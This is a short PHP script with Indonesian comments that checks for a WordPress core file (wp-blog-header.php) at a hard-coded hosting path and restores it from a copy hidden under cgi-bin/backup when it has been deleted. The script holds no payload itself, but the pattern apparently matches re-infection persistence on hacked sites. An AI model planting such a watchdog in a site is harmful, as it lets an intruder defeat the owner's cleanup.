<?php
$file = '/home/he109633/aislacastilla.com/wp-blog-header.php';
$backup = '/home/he109633/aislacastilla.com/cgi-bin/backup/wp-blog-header.php';

// Cek apakah file telah dihapus
if (!file_exists($file)) {
    // Jika file dihapus, kembalikan dari backup
    copy($backup, $file);
    echo "File .php telah dihapus, tapi sudah dikembalikan dari backup.";
} else {
    echo "File .php aman.";
}
?>
